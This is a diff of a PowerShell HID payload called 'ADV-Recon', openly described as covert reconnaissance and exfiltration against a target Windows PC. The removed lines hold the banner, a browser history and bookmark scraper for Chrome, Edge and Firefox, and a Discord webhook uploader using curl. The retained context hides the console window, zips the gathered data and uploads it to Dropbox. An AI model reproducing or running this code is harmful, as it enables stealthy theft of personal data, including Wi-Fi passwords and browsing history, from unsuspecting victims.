@@ -1,37 +1,3 @@
-############################################################################################################################################################                      
-#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
-# Title        : ADV-Recon         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
-# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
-# Version      : 2.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
-# Category     : Recon             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
-# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
-# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
-#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
-#                                  |  and yea curiosity killed the cat                         ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                        
-#                                  |  but satisfaction brought him back                       (((^_(((/(((_/ #          /     \     /     \                #    
-#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
-#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
-#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
-#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
-#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
-#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
-############################################################################################################################################################
-                                                                                                                                                                                                                                               
-<#
-.SYNOPSIS
-	This is an advanced recon of a target PC and exfiltration of that data.
-.DESCRIPTION 
-	This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running.
-	All of the gather information is formatted neatly and output to a file.
-	That file is then exfiltrated to cloud storage via Dropbox.
-.Link
-      https://developers.dropbox.com/oauth-guide	    # Guide for setting up your Dropbox for uploads
-      https://www.youtube.com/watch?v=Zs-1j42ySNU           # My youtube tutorial on Discord Uploads 
-      https://www.youtube.com/watch?v=VPU7dFzpQrM           # My youtube tutorial on Dropbox Uploads
-#>
-
-############################################################################################################################################################
-
 $i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
 add-type -name win -member $i -namespace native;
 [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
@@ -470,51 +436,6 @@ $output > $env:TEMP\$FolderName/computerData.txt
 
 ############################################################################################################################################################
 
-function Get-BrowserData {
-
-    [CmdletBinding()]
-    param (	
-    [Parameter (Position=1,Mandatory = $True)]
-    [string]$Browser,    
-    [Parameter (Position=1,Mandatory = $True)]
-    [string]$DataType 
-    ) 
-
-    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-
-    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
-    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
-    
-
-    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
-    $Value | ForEach-Object {
-        $Key = $_
-        if ($Key -match $Search){
-            New-Object -TypeName PSObject -Property @{
-                User = $env:UserName
-                Browser = $Browser
-                DataType = $DataType
-                Data = $_
-            }
-        }
-    } 
-}
-
-Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
-Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
-
-Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
-
-Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
-
-############################################################################################################################################################
-
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
 
 # Upload output file to dropbox
@@ -532,35 +453,6 @@ Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Pos
 }
 
 if (-not ([string]::IsNullOrEmpty($db))){dropbox}
-
-############################################################################################################################################################
-
-function Upload-Discord {
-
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
-
-$hookurl = "$dc"
-
-$Body = @{
-  'username' = $env:username
-  'content' = $text
-}
-
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
-}
-
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
-
- 
 
 ############################################################################################################################################################
 
